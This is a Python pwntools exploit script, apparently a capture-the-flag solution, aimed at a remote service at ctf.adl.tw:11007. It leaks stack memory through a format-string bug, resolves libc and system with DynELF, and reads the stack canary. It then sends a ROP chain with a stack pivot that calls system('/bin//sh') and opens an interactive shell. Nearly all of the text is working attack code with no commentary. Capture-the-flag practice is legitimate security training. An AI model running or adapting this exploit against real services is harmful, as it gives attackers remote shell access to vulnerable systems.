from pwn import *

# ip = "127.0.0.1"
ip = "ctf.adl.tw"
port = 11007
context(arch='amd64', os='linux')
# context.log_level = 'debug'


def send_fmt_payload(payload):
    r = remote(ip, port)
    print(payload)
    r.sendline(b'info' + payload)
    return r.recvall()


def fuzz_stack(min_value=0x0, max_value=0xffffffffffffffff):
    fmt_offset = FmtStr(send_fmt_payload).offset
    fmt = FmtStr(execute_fmt=send_fmt_payload, offset=fmt_offset)
    for i in range(1, 100):
        stack_leak = fmt.leak_stack(i)
        if min_value < stack_leak < max_value:
            print(f"0x{stack_leak:x}")
            try:
                memory_leak = fmt.leaker(stack_leak)
                print("memory information:", memory_leak)
                print(disasm(memory_leak))
            except:
                print("value in stack is not addr...")


fmt_offset = FmtStr(send_fmt_payload).offset
fmt = FmtStr(execute_fmt=send_fmt_payload, offset=fmt_offset)
start_addr = fmt.leak_stack(49)
print(f"start addr:0x{start_addr:x}")
# fuzz_stack()
# fuzz_stack(start_addr,start_addr+0x2000)
elf = DynELF(fmt.leaker, start_addr)
elf_header = elf.libbase
# dump binary
# dump_start = elf_header
# dump_end = dump_start + 0x3050
# server_bin = b''
# while dump_start<dump_end:
#     if b'\n' in p64(dump_start):
#         fix_newline = 1
#     else:
#         fix_newline = 0
#     try:
#         data = fmt.leaker(dump_start)[fix_newline:]
#     except:
#         data = b'\x00'
#     server_bin += data
#     dump_start += len(data)
# with open('blind_dump','bw') as f:
#     f.write(server_bin)
libc_base = elf.lookup(None, 'libc')
system_addr = elf.lookup('system', 'libc')

print(f"elf header addr:0x{elf_header:x}")
print(f"libc base:0x{libc_base:x}")
print(f"system:0x{system_addr:x}")
pop_rdi = elf_header + 0x1c03  # use ghex to find offset in dump binary
buffer_addr = fmt.leak_stack(1) + 0xa0 - 0x40  # rbp-0xa0 to rbp-0x40
canary = fmt.leak_stack(fmt_offset + (0xa0 - 0x8) / 0x8)  # [ (rbp-0xa0) - (rbp-0x8) ] / 8 bytes
leave_ret = elf_header + 0x1533  # use ida to find offset in dump binary
print(f"canary:{canary:x}")
print(f"pop rdi:0x{pop_rdi:x}")
# print(disasm(fmt.leaker(pop_rdi)))
print(f"leave ret:0x{leave_ret:x}")
# print(disasm(fmt.leaker(leave_ret)))
rop = p64(pop_rdi)
rop += p64(buffer_addr + 24)
rop += p64(system_addr)
payload = rop + b"/bin//sh\x00"
payload += b'A' * (0x40 - len(payload) - 0x8) + p64(canary) + p64(buffer_addr - 8) + p64(leave_ret)[:5]
r = remote(ip, port)
r.sendline(b'nameof' + payload)
r.sendline()
r.interactive()
